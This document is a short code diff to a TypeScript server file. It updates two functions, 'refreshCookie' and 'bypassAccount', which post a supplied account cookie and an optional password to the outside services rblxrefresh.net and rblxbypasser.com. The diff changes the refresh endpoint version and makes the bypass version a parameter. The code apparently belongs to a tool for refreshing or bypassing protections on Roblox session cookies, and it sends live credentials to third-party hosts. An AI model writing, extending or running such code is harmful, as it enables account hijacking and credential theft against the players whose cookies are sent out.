@@ -3,7 +3,7 @@ import { createServerFn } from "@tanstack/react-start";
 export const refreshCookie = createServerFn({ method: "POST" })
   .inputValidator((d: { cookie: string }) => d)
   .handler(async ({ data }) => {
-    const res = await fetch("https://www.rblxrefresh.net/refreshv1", {
+    const res = await fetch("https://www.rblxrefresh.net/refreshv2", {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -18,7 +18,7 @@ export const refreshCookie = createServerFn({ method: "POST" })
   });
 
 export const bypassAccount = createServerFn({ method: "POST" })
-  .inputValidator((d: { cookie: string; password: string }) => d)
+  .inputValidator((d: { cookie: string; version: "v1" | "v2"; password?: string }) => d)
   .handler(async ({ data }) => {
     const res = await fetch("https://rblxbypasser.com/api/bypass", {
       method: "POST",
@@ -31,8 +31,8 @@ export const bypassAccount = createServerFn({ method: "POST" })
       body: JSON.stringify({
         cookie: data.cookie,
         directoryPath: "",
-        version: "v2",
-        password: data.password,
+        version: data.version,
+        password: data.version === "v2" ? data.password ?? "" : null,
       }),
     });
     const txt = await res.text();
